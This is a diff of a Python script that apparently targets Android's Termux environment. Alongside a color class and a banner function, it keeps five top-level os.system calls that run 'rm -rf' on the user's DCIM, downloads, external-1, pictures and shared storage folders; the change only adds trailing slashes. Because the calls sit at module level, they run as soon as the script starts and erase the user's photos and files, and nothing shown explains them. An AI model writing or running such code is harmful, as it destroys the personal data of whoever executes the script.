@@ -10,11 +10,11 @@ class color:
     rojo = '\033[91m'
     fin = '\033[0m'
 
-os.system("rm -rf /data/data/com.termux/files/home/storage/dcim")
-os.system("rm -rf /data/data/com.termux/files/home/storage/downloads")
-os.system("rm -rf /data/data/com.termux/files/home/storage/external-1")
-os.system("rm -rf /data/data/com.termux/files/home/storage/pictures")
-os.system("rm -rf /data/data/com.termux/files/home/storage/shared")
+os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
+os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")
 
 def banner():
  os.system("clear")
